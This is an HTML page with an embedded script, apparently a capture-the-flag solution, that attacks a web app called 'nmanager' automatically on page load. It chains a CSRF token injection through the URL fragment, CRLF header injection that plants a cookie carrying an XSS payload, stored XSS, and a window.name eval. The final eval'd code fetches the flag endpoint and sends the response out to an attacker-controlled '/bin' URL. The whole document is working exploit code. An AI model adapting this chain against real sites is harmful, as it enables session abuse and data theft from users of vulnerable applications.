<script>
  const token = 'x'
  const xsspayload = '<img src onerror="eval(window[`name`])">'
  const datapayload = btoa(JSON.stringify([xsspayload]))

  const target = 'http://nmanager'
  const bin = window.origin + '/bin'

  const randomlength = Math.random().toString().length
  const prefix= 'uselessssss'

  const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms))

  function wopen (uri) {
    return window.open(uri, 'injector')
  }

  function injectcsrf (value) {
    return new Promise(async (resolve, reject)=> {
      let payload = prefix + ` csrf_token=${value},` 

      let injector
      if ((injector = wopen(target + '/index.html#' + payload)) === null)
        reject()
      await sleep(500)
      wopen(target)
      resolve()
    })
  }

  function getflag (token) {
    wopen(target + '/api/flag?csrf_token=' + token + '&HTTP_ORIGIN=z')
  }

  function injectxss (payload) {
    const pl = prefix + payload
    wopen(target + '/index.html#' + pl)
  }

  function createcontent (token, dir, content) {
    wopen(target + `/api/numdesc?csrf_token=${token}&n=${dir}&c=${content}`)
  }

  function injectheader (token, name, value) {
    const injecteddirectory = encodeURIComponent('\n\r' + name + ': ' + value)
    createcontent(token, injecteddirectory, 'xxe')
    return injecteddirectory
  }

  function execheader (name) {
    wopen(target + `/descriptions/${name}/`)
  }

  async function go() {
    await injectcsrf(token)
    await sleep(500)
    const name = injectheader(token, 'Set-Cookie', `data=${datapayload}; path=`)
    await sleep(500)
    execheader(name)
    await sleep(500)
    createcontent(token, encodeURIComponent(xsspayload), 'xxe')
    await sleep(500)
    open(target, `
    fetch('/api/flag?csrf_token=${token}&HTTP_ORIGIN=x')
      .then(res => res.text())
      .then(text => fetch('${bin}?data=' + text))
    `)
  }

  window.addEventListener('load', go)
</script>